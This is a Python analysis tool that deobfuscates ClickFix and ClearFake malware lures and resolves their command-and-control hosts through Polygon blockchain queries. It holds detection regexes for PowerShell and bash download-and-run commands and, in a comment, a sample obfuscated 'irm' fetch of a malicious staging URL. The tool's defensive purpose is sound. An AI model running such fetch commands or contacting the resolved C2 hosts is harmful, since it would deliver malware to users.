import re
import base64
import requests

class PayloadDecoder:
    """
    Deobfuscation and extraction engine for ClickFix / ClearFake payloads:
    1. Base64 encoded URLs (aHR0...)
    2. PowerShell UTF-16LE (-enc ...)
    3. ClearFake Double-XOR JavaScript
    4. Polygon / BSC Smart Contract C2 Resolver
    """
    B64_URL_PATTERN = re.compile(r'(aHR0cHM6Ly[A-Za-z0-9+/=]{10,}|aHR0cDov[A-Za-z0-9+/=]{10,})')
    PS_ENC_PATTERN = re.compile(r'-(?:e|enc|encodedcommand)\s+([A-Za-z0-9+/=]{20,})', re.IGNORECASE)

    # Public RPC nodes for blockchain queries
    RPC_ENDPOINTS = [
        "https://polygon-bor-rpc.publicnode.com",
        "https://1rpc.io/matic",
        "https://polygon.drpc.org",
        "https://rpc.ankr.com/polygon"
    ]

    @classmethod
    def decode_b64_urls(cls, text: str) -> list[str]:
        """Finds and decodes hidden base64 URLs starting with aHR0 (http/https)"""
        found_urls = []
        matches = cls.B64_URL_PATTERN.findall(text)
        for b64 in matches:
            try:
                padding = len(b64) % 4
                if padding:
                    b64 += '=' * (4 - padding)
                decoded = base64.b64decode(b64).decode('utf-8', errors='ignore')
                urls = re.findall(r'https?://[^\s\'"<>]+', decoded)
                for u in urls:
                    if not any(b in u.lower() for b in ["w3.org", "schema.org", "google.com/recaptcha"]):
                        found_urls.append(u)
            except Exception:
                pass
        return list(set(found_urls))

    @classmethod
    def decode_powershell(cls, text: str) -> list[str]:
        """Decodes PowerShell encoded or plain irm/iex commands and extracts URLs"""
        found_urls = []
        # 1. Base64 UTF-16LE encoded commands
        match = cls.PS_ENC_PATTERN.search(text)
        if match:
            try:
                b64 = match.group(1)
                padding = len(b64) % 4
                if padding:
                    b64 += '=' * (4 - padding)
                decoded = base64.b64decode(b64).decode('utf-16le', errors='ignore')
                urls = re.findall(r'https?://[^\s\'"<>]+', decoded)
                found_urls.extend(urls)
            except Exception:
                pass

        # 2. Plain irm / iex / DownloadString
        plain_urls = re.findall(r"(?:irm|iwr|Invoke-RestMethod|Invoke-WebRequest|DownloadString|DownloadFile)\s*(?:['\"]|\(\s*['\"])(https?://[^'\"\s\)]+)", text, re.IGNORECASE)
        for u in plain_urls:
            u_clean = u.replace(r"\/", "/")
            if "." in u_clean.split("://")[-1]:
                found_urls.append(u_clean)

        return list(set(found_urls))

    @classmethod
    def decode_cfmd_captcha(cls, dom_or_js: str) -> dict:
        """
        Detects and decodes the __cfmdCaptcha / ClickFix lure framework:
        1. Fake Microsoft Account / Cloudflare verification dialogs
        2. In-line COMMANDS object: PowerShell (Windows) and curl/bash (macOS)
        3. String concatenation & PowerShell -f format deobfuscation
        4. Staging URLs with custom X-WUA headers and WUA/ user agents
        5. Secondary batch/zip downloaders (KL.bat, KL.zip, KL.exe)
        """
        result = {
            "is_cfmd": False,
            "lure_type": None,
            "staging_urls": [],
            "live_c2_url": None,
            "delivery_url": None,
            "wua_token": None
        }

        has_cfmd = "__cfmdCaptcha" in dom_or_js
        has_commands = 'COMMANDS = {"windows":' in dom_or_js or 'COMMANDS = {windows:' in dom_or_js
        has_wua = "X-WUA" in dom_or_js or "WUA/" in dom_or_js
        has_kl = "KL.bat" in dom_or_js or "KL.zip" in dom_or_js or "verify-page.js" in dom_or_js
        has_lom = "/lom/" in dom_or_js or "/lom_p2/" in dom_or_js or "/hex/lom/" in dom_or_js

        if not (has_cfmd or has_commands or has_wua or has_kl or has_lom):
            return result

        result["is_cfmd"] = True
        if "MICROSOFT ACCOUNT" in dom_or_js or "ms_verify_you" in dom_or_js or "Confirm this sign-in" in dom_or_js:
            result["lure_type"] = "Fake Microsoft Account Verification"
        elif "cf_verify_action" in dom_or_js or "Verify you are human" in dom_or_js or "cf_needs_review" in dom_or_js:
            result["lure_type"] = "Fake Cloudflare Verification"
        elif has_kl:
            result["lure_type"] = "Fake Cloudflare / Batch Dropper"
        else:
            result["lure_type"] = "ClickFix Verification Dialog"

        wua_m = re.search(r"WUA/([a-zA-Z0-9_-]+)", dom_or_js)
        if wua_m:
            result["wua_token"] = wua_m.group(1)

        urls = set()

        # Format A: Plain irm 'https://...'
        plain_m = re.findall(r"irm\s+['\"](https?://[^'\"\s\)]+)['\"]", dom_or_js, re.IGNORECASE)
        for u in plain_m:
            u_c = u.replace(r"\/", "/")
            if "." in u_c.split("://")[-1]:
                urls.add(u_c)

        # Format B: irm (('{0}{1}' -f 'h','ttps://')+('inte'+'rnetserchinkas.co')+'/hex/lom/84aa3f59')
        f_matches = re.finditer(r"irm\s+\(\s*([^\)]+-[^\)]+)\)", dom_or_js, re.IGNORECASE)
        for fm in f_matches:
            expr = fm.group(1)
            f_op = re.search(r"'([^']*)'\s*-f\s*([^\)]+)", expr)
            prefix = ""
            if f_op:
                fmt = f_op.group(1)
                args = re.findall(r"'([^']*)'", f_op.group(2))
                try:
                    prefix = fmt.format(*args)
                except Exception:
                    prefix = "".join(args)
                expr = expr[f_op.end():]
            rem = re.findall(r"'([^']*)'", expr)
            full_url = (prefix + "".join(rem)).replace(r"\/", "/")
            if full_url.startswith("http") and "." in full_url.split("://")[-1]:
                urls.add(full_url)

        # Format C: macOS echo base64 | bash
        b64_mac = re.findall(r"echo\s+['\"]?([A-Za-z0-9+/=]{20,})['\"]?\s*\|\s*base64\s+-d", dom_or_js)
        for b in b64_mac:
            try:
                dec = base64.b64decode(b).decode("utf-8", errors="ignore")
                for uf in re.findall(r"https?://[^\s'\"<>]+", dec):
                    uf_c = uf.replace(r"\/", "/")
                    if "." in uf_c.split("://")[-1]:
                        urls.add(uf_c)
            except Exception:
                pass

        # Format D: Direct script injection (interseq.at/lom_p2/api?_v=...)
        interseq_m = re.findall(r"https?://[a-zA-Z0-9.-]+/(?:lom_p2/api|verify-page\.js|KL\.bat|KL\.zip)[^\s'\"<>]*", dom_or_js)
        for u in interseq_m:
            u_c = u.replace(r"\/", "/")
            if "." in u_c.split("://")[-1]:
                urls.add(u_c)

        # Format E: Direct /lom/ or /h/ or /hex/ URLs
        direct_lom = re.findall(r"https?://[a-zA-Z0-9.-]+/(?:lom|h|hex/lom)/[a-f0-9]+", dom_or_js)
        for u in direct_lom:
            u_c = u.replace(r"\/", "/")
            if "." in u_c.split("://")[-1]:
                urls.add(u_c)

        clean_urls = list(urls)
        result["staging_urls"] = clean_urls
        for u in clean_urls:
            dom = u.split("://")[-1].split("/")[0].split(":")[0]
            if not result["live_c2_url"]:
                result["live_c2_url"] = f"https://{dom}"
            if not result["delivery_url"]:
                result["delivery_url"] = u

        return result


    @classmethod
    def decode_clearfake_js(cls, dom_or_js: str) -> dict:
        """
        Detects and decodes ClearFake double-XOR obfuscated JavaScript,
        then queries the blockchain smart contract to resolve the live C2!
        """
        result = {
            "is_clearfake": False,
            "smart_contract": None,
            "method_hash": None,
            "live_c2_url": None,
            "delivery_url": None
        }

        # Check for ClearFake XOR signature
        has_xor = "String.fromCharCode" in dom_or_js and "atob" in dom_or_js
        if has_xor:
            try:
                arr_m = re.search(r'\[([0-9, ]{100,})\]', dom_or_js)
                k1_var_m = re.search(r'fromCharCode\([^)]*\^\s*([a-zA-Z0-9_$]+)\)', dom_or_js)
                k2_var_m = re.search(r'charCodeAt\([^)]*\)\s*\^\s*([a-zA-Z0-9_$]+)', dom_or_js)

                if arr_m and k1_var_m and k2_var_m:
                    k1_var = k1_var_m.group(1)
                    k2_var = k2_var_m.group(1)

                    k1_val = int(re.search(rf'{re.escape(k1_var)}\s*=\s*([0-9]+)', dom_or_js).group(1))
                    k2_val = int(re.search(rf'{re.escape(k2_var)}\s*=\s*([0-9]+)', dom_or_js).group(1))

                    arr = [int(x.strip()) for x in arr_m.group(1).split(',')]

                    # Deobfuscate layer 1 (XOR) -> layer 2 (Base64) -> layer 3 (XOR)
                    s1 = ''.join([chr(x ^ k1_val) for x in arr])
                    s2 = base64.b64decode(s1)
                    deobfuscated_js = ''.join([chr(b ^ k2_val) for b in s2])

                    result["is_clearfake"] = True

                    # Extract smart contract (0x...) and method
                    contract_match = re.search(r'(0x[a-fA-F0-9]{40})', deobfuscated_js)
                    method_match = re.search(r'=\s*[\'"]([a-fA-F0-9]{8})[\'"]', deobfuscated_js)
                    secret_match = re.search(r'=\s*[\'"]([a-fA-F0-9]{32,64})[\'"]', deobfuscated_js)

                    if contract_match:
                        result["smart_contract"] = contract_match.group(1)
                    if method_match:
                        result["method_hash"] = f"0x{method_match.group(1)}"

                    # Resolve live C2 from blockchain
                    if result["smart_contract"] and result["method_hash"]:
                        live_c2 = cls.resolve_blockchain_c2(result["smart_contract"], result["method_hash"])
                        if live_c2:
                            result["live_c2_url"] = live_c2
                            if secret_match:
                                secret = secret_match.group(1)
                                result["delivery_url"] = f"{live_c2}/api.php?s={secret}"

            except Exception:
                pass

        # Check if injected C2 script tag is already rendered in the DOM
        api_match = re.search(r'(https?://([a-zA-Z0-9.-]+)/api\.php\?s=([a-f0-9]+))', dom_or_js)
        if api_match:
            result["is_clearfake"] = True
            delivery_url = api_match.group(1)
            c2_host = api_match.group(2)
            c2_base = f"https://{c2_host}"
            if not result.get("live_c2_url"):
                result["live_c2_url"] = c2_base
            if not result.get("delivery_url"):
                result["delivery_url"] = delivery_url

        return result

    @classmethod
    def resolve_blockchain_c2(cls, contract_addr: str, method_hash: str) -> str:
        """Queries Polygon RPC nodes using eth_call to get the live C2 domain"""
        payload = {
            "jsonrpc": "2.0",
            "method": "eth_call",
            "params": [{"to": contract_addr, "data": method_hash}, "latest"],
            "id": 1
        }

        for rpc in cls.RPC_ENDPOINTS:
            try:
                resp = requests.post(rpc, json=payload, timeout=5)
                if resp.status_code == 200:
                    raw_hex = resp.json().get("result", "")
                    if raw_hex and len(raw_hex) > 130:
                        raw = raw_hex[2:] if raw_hex.startswith("0x") else raw_hex
                        length = int(raw[64:128], 16)
                        data_hex = raw[128:128 + length * 2]
                        decoded_url = bytes.fromhex(data_hex).decode("utf-8", errors="ignore").strip('\x00')
                        if decoded_url.startswith("http"):
                            return decoded_url
            except Exception:
                continue
        return None
